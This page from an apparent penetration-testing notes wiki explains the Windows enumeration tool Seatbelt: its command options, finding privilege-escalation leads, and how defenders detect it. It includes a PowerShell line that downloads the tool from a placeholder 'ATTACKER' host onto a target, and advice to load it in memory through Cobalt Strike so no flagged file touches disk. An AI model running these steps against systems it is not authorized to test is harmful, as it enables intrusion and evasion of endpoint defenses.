# Seatbelt

[GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt) — a **Windows** C# host-survey tool. Deeper and more structured than [winPEAS](PEASS.md) for security-relevant settings, and the standard choice in .NET / C2 tradecraft because it runs cleanly in memory via `execute-assembly`. You usually **compile it yourself** (Visual Studio / `dotnet build`) or use a build your C2 ships.

> Authorized testing only. Note it in your engagement `tools.txt`; confirm findings by hand against [Windows Privilege Escalation](../Windows/Privilege%20Escalation.md).

## Contents

- [Get it onto the target](#get-it-onto-the-target)
- [Run it](#run-it)
- [In memory (no binary on disk)](#in-memory-no-binary-on-disk)
- [Reading the output](#reading-the-output)
- [Defense / detection](#defense--detection)
- [Related](#related)

## Get it onto the target

```powershell
iwr -Uri http://ATTACKER/Seatbelt.exe -OutFile C:\Windows\Temp\sb.exe
```

Prefer the in-memory route below where you have a C2 or a .NET loader. Transfer channels: [smb](../Tools/smb.md), [netcat](../Shell/netcat.md).

## Run it

```cmd
Seatbelt.exe -group=all             :: every check
Seatbelt.exe -group=all -full       :: don't filter to "interesting" only
Seatbelt.exe -group=system          :: system-level security data
Seatbelt.exe -group=user            :: current user (or all users if elevated)
Seatbelt.exe -group=remote          :: checks suited to remote/WMI collection
Seatbelt.exe -group=misc            :: browser history, event logs, etc.
Seatbelt.exe OSInfo                 :: one named check
Seatbelt.exe "LogonEvents 30"       :: one command with an argument
Seatbelt.exe -group=all -AuditPolicies   :: all EXCEPT this check (minus-prefix excludes)
```

| Parameter | Does |
| --- | --- |
| `-group=<all\|system\|user\|remote\|misc\|slack\|chromium>` | Run a predefined group |
| `<Command>` | Run one named check, e.g. `Seatbelt.exe OSInfo` |
| `"Command arg"` | Command with an argument |
| `-full` | Return everything, not just filtered "interesting" results |
| `-q` | Quiet (no banner) |
| `-outputfile="C:\Temp\sb.txt"` | Write to `.txt` or `.json` |
| `-computername=HOST -username=DOM\u -password=p` | Enumerate a **remote** host |

## In memory (no binary on disk)

```
execute-assembly /path/Seatbelt.exe -group=all      # Cobalt Strike / .NET loader
```

This is the usual way to run it — avoids dropping a flagged `.exe`, though EDR still sees the assembly load.

## Reading the output

Seatbelt's default filter already surfaces the security-relevant items; add `-full` only when you need the raw picture. Map hits — unquoted service paths, token privileges, stored creds, AlwaysInstallElevated, UAC level — to techniques in [Windows Privilege Escalation](../Windows/Privilege%20Escalation.md), and verify by hand before reporting. It's also strong for **situational awareness** (AV, applocker, logon events, RDP sessions) feeding [AD](../AD/README.md) work.

## Defense / detection

- The `Seatbelt.exe` binary hits AV signatures; in-memory use trips EDR on `execute-assembly` / suspicious .NET assembly loads. Command-line logging catches the invocation.
- Wide reads of security settings, registry and event logs from one process in a short window is the signature. See [Host-based logging on Windows](../../Defense/Logging/Host-based/Windows.md).
- Fix what it finds — [2. Windows Hardening](../../Defense/System%20and%20Services%20Hardening/2.%20Windows%20Hardening.md).

## Related

[folder README](README.md) · [PEASS](PEASS.md) (winPEAS) · [Windows Privilege Escalation](../Windows/Privilege%20Escalation.md) · [AD](../AD/README.md) · [Metasploit](../Tools/Metasploit.md)
